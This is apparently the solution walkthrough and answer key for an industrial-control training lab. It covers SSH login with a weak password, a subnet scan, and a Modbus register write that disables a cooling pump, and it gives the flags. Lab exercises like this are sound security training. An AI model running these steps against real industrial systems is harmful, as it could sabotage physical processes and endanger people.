# Industrial Protocol Manipulation Sandbox — Solution Walkthrough

This document provides the complete step-by-step solutions for the **Industrial Protocol Manipulation Sandbox** (`complex-operator-ot-sandbox`) training scenario. 

---

## Network Layout

| Host | Subnet | IP | Services |
|---|---|---|---|
| `attacker-host` | corporate-net | `10.10.10.50` | Kali Linux (attacker workstation) |
| `engineering-station` (EWS) | control-net | `192.168.20.20` | SSH (22), Modbus Client CLI |
| `openplc-node` (PLC) | control-net | `192.168.20.10` | OpenPLC Modbus Server (502) |
| `ot-gateway` | corporate-net / control-net | `10.10.10.1` / `192.168.20.1` | Gateway firewall router |

### Firewall Rules (configured on `ot-gateway`)

*   Attacker (`10.10.10.50` on `corporate-net`) is allowed to connect to EWS (`192.168.20.20` on `control-net`) via SSH (port 22).
*   Attacker is blocked from reaching the PLC (`192.168.20.10`) directly.
*   EWS is allowed to reach the PLC via Modbus TCP (port 502).

---

## Level 1: Initial Access & Recon

**Objective:** Gain initial access to the EWS and locate the target PLC on the internal control network.

**Answer:** `192.168.20.10`

### Steps:
1.  Open the console of **`attacker-host`** via the training portal.
2.  Establish an SSH connection to the EWS:
    ```bash
    ssh operator@192.168.20.20
    ```
3.  Enter the password: **`operator123`**
4.  Perform reconnaissance to discover active hosts on the `control-net` (`192.168.20.0/24`) using `nmap`:
    ```bash
    nmap -sn 192.168.20.0/24
    ```
    *Alternatively, run a manual ping sweep:*
    ```bash
    for ip in {1..254}; do ping -c 1 -W 1 192.168.20.$ip | grep "64 bytes"; done
    ```
5.  Identify the active PLC IP address: **`192.168.20.10`**.

---

## Level 2: Process Sabotage (Modbus Manipulation)

**Objective:** Write `0` to Modbus holding register 0 (Address 40001) on the PLC to disable the cooling pump and generate the safety override confirmation log.

**Answer:** `FLAG{PUMP_DISABLED_SUCCESS}`

### Steps:
1.  From the EWS command shell (`operator@192.168.20.20`), run the pre-installed `modbus` client command to write value `0` to holding register address `40001` (Register index `0`):
    ```bash
    modbus write 192.168.20.10 40001 0
    ```
2.  Wait a moment for the safety monitor daemon on the EWS to detect the change, log the event, and output the flag file:
    ```bash
    cat /var/log/safety_override.txt
    ```
3.  Retrieve the flag: **`FLAG{PUMP_DISABLED_SUCCESS}`**.
